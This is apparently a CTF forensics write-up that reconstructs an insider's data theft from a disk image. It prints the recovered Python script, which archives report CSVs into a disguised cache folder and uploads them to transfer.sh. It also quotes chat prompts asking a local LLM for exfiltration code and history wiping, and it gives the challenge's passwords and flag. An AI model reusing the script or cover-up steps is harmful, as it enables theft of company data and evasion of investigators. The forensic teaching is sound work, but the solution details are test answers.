# Whisper Evidence - CTF Challenge Writeup

**Competition:** BlackHat MEA Qualification CTF 2026  
**Category:** Digital Forensics / Insider Threat  
**Difficulty:** Medium  
**Flag Format:** BHFlagY{...}  
**Author:** aintantony

## Challenge Overview
This is a digital forensics challenge involving data exfiltration from a compromised system. The challenge provides a forensic disk image containing evidence of insider threat activity.

## TL;DR
1. Found suspicious Ollama AI chat history revealing password: `Gr33nF0x42!D1amond`
2. Discovered malicious Python script in Trash that derives encryption key using blake2b
3. Located encrypted zip at `.cache/fontconfig/session.zip`
4. Extracted archive using derived password: `d571fe77618f54b7fca8`
5. Found flag base64-encoded in `internal_api_keys.csv` → `master_vault` entry

## Flag
```
BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}
```

## Prerequisites
- Python 3 with `pyzipper` library installed
- Access to the forensic evidence directory
- Basic knowledge of Linux filesystem and forensics

## Solution Path

### 1. Initial Reconnaissance
The forensic evidence contains a typical Linux filesystem structure with several key directories:
- `/home/dwright/` - User home directory
- `/data/reports/` - Sensitive CSV files (customers, employees, revenue, vendors)
- `/tmp/` - Temporary files
- `journal_exports/` - System logs
- `system_info/` - System state information

**Investigation Strategy:**
Since this involves insider threat, I focused on:
- User home directory artifacts (browser history, chat logs, dotfiles)
- Hidden files and directories (anything starting with `.`)
- Trash/deleted files
- Recently accessed or modified files
- Suspicious scripts or executables

### 2. Key Discovery: Ollama Chat History
**Why check this?** Ollama is a local AI assistant - users might ask it for help with malicious activities thinking it's private. The history file at `/home/dwright/.ollama/history` is a goldmine.
Found in `/home/dwright/.ollama/history`, the user's AI assistant chat log revealed suspicious queries:

```
how do I create a password protected zip archive using pyzipper
write a python script that reads all csv files from a directory and creates an AES encrypted zip archive
use the password Gr33nF0x42!D1amond
also upload the archive to a remote server using requests and delete the script after successful execution
how do I derive an encryption key from a passphrase using hashlib sha256
how to clean the bash history in terminal so there are no traces
```

**Key findings:**
- User asked about creating encrypted archives
- Password revealed: `Gr33nF0x42!D1amond`
- Intent to exfiltrate data to remote server
- Attempted to cover tracks by cleaning bash history

### 3. Malicious Script Discovery
Found the exfiltration script in the Trash directory:
`/home/dwright/.local/share/Trash/files/cache_mgr.py`

**Script Analysis:**
```python
#!/usr/bin/env python3
"""Cache management utility."""
import os, sys, glob, hashlib
from datetime import datetime

# Import from hidden venv
sys.path.insert(0, os.path.expanduser("~/.local/share/.venv/lib/python3.12/site-packages"))
try:
    import pyzipper
except ImportError:
    sys.exit(1)

raw_key = os.environ.get("CACHE_KEY", "")
if not raw_key:
    sys.exit(1)

# Derive actual encryption key from the raw passphrase
ARCHIVE_PASSWORD = hashlib.blake2b(
    raw_key.encode(),
    digest_size=32
).hexdigest()[:20].encode()

DATA_DIR = os.path.join("/data", "reports")
CACHE_DIR = os.path.join(os.path.expanduser("~"), ".cache", "fontconfig")
OUTPUT_PATH = os.path.join(CACHE_DIR, "session.zip")

def collect_and_archive():
    os.makedirs(CACHE_DIR, exist_ok=True)
    csv_files = glob.glob(os.path.join(DATA_DIR, "*.csv"))
    if not csv_files:
        return None
    with pyzipper.AESZipFile(OUTPUT_PATH, 'w', compression=pyzipper.ZIP_DEFLATED,
                              encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(ARCHIVE_PASSWORD)
        for fp in csv_files:
            zf.write(fp, os.path.basename(fp))
    return OUTPUT_PATH

def upload(filepath):
    try:
        import requests
        with open(filepath, 'rb') as f:
            requests.put("https://transfer.sh/backup.zip", data=f,
                        headers={"Content-Type": "application/octet-stream"}, timeout=30)
    except:
        pass
```

**Key points:**
- Disguised as "cache management utility"
- Uses environment variable `CACHE_KEY` for password
- Derives encryption key using `blake2b` hash (first 20 hex chars)
- Archives all CSV files from `/data/reports/`
- Uploads to `transfer.sh`
- Hides zip in `.cache/fontconfig` directory

### 4. Password Derivation
The script doesn't use the raw password directly. It derives the encryption key:

```python
import hashlib
password = hashlib.blake2b("Gr33nF0x42!D1amond".encode(), digest_size=32).hexdigest()[:20]
# Result: d571fe77618f54b7fca8
```

The actual encryption password used is: `d571fe77618f54b7fca8`

### 5. Encrypted Archive Location
Found the encrypted archive at:
`/home/dwright/.cache/fontconfig/session.zip`

### 6. Archive Extraction
Using the derived password, extracted the archive contents:

```python
import sys
# Point to the pyzipper library in the forensic evidence
sys.path.insert(0, "/path/to/whisper_evidence/home/dwright/.local/share/.venv/lib/python3.12/site-packages")
import pyzipper
import hashlib

# Derive the actual password from the plaintext password
password = hashlib.blake2b("Gr33nF0x42!D1amond".encode(), digest_size=32).hexdigest()[:20].encode()

# Path to the encrypted archive
zip_path = "/path/to/whisper_evidence/home/dwright/.cache/fontconfig/session.zip"

# List contents
with pyzipper.AESZipFile(zip_path) as zf:
    zf.setpassword(password)
    for name in zf.namelist():
        print(name)
```

**Alternative:** Install pyzipper locally:
```bash
pip install pyzipper
```

**Files in archive:**
- customers_2025.csv
- employee_directory.csv
- **internal_api_keys.csv** ← Flag location
- revenue_q3.csv
- vendor_contracts.csv

### 7. Flag Discovery
Extracted `internal_api_keys.csv` and found an unusual entry:

```csv
master_vault,QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==,production,vault_root,security_team,11/1/2024,12/31/2025,Active
```

The `master_vault` key is base64 encoded. Decoding it:

```bash
echo "QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==" | base64 -d
```

**Result:** `BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}`

## Attack Chain Summary

1. **Reconnaissance:** Insider (dwright) used Ollama AI assistant to learn how to exfiltrate data
2. **Preparation:** Created malicious Python script disguised as cache management utility
3. **Execution:** Script collected all CSV files from `/data/reports/`
4. **Encryption:** Files encrypted using AES zip with derived password
5. **Exfiltration:** Attempted upload to transfer.sh
6. **Cover-up:** Moved script to Trash, attempted to clean bash history
7. **Artifact Left Behind:** Encrypted archive remained in `.cache/fontconfig/`

## Red Flags & Indicators of Compromise

1. **AI Assistant Queries:** Suspicious questions about data encryption and exfiltration
2. **Hidden Virtual Environment:** Python environment in `.local/share/.venv/`
3. **Script in Trash:** Malicious script deleted but recoverable
4. **Unusual Cache Location:** Zip file hidden in fontconfig cache directory
5. **Sensitive Data File:** `internal_api_keys.csv` not present in original `/data/reports/` directory
6. **Environment Variable Usage:** Script designed to be run with external password via env var

## Tools & Techniques Used

- **Python pyzipper:** AES encryption for zip archives
- **hashlib blake2b:** Password key derivation
- **Base64 encoding:** Flag obfuscation
- **transfer.sh:** Free file transfer service for exfiltration
- **Ollama LLM:** Local AI assistant used to plan attack

## Lessons Learned

1. Monitor AI assistant/LLM query logs for suspicious patterns
2. Audit Python virtual environments in user directories
3. Check trash/recycle bins during forensic investigations
4. Look for encrypted archives in unusual locations
5. Correlate chat logs with filesystem artifacts
6. Hash-based password derivation can obscure the actual encryption key

## Tips for Similar Challenges

1. **Check AI assistant histories:** `.ollama/history`, ChatGPT exports, Claude conversations
2. **Search for encryption tools:** `grep -r "pyzipper\|cryptography\|AES" ~/.local/`
3. **Examine dotfiles:** `.bash_history`, `.python_history`, `.viminfo`
4. **Inspect Trash/Recycle:** Users often delete evidence but it's recoverable
5. **Look for hidden directories:** `find /home -name ".*" -type d`
6. **Check environment variables:** Many tools use env vars for secrets
7. **Analyze file timestamps:** `stat` command shows access/modify times

## Timeline

- **2025-06-16:** System logs show Ollama activity
- **2025-06-18-20:** Meeting notes show normal work activity (cover)
- **Unknown:** Script execution and data exfiltration
- **Forensic Capture:** Archive still present on disk

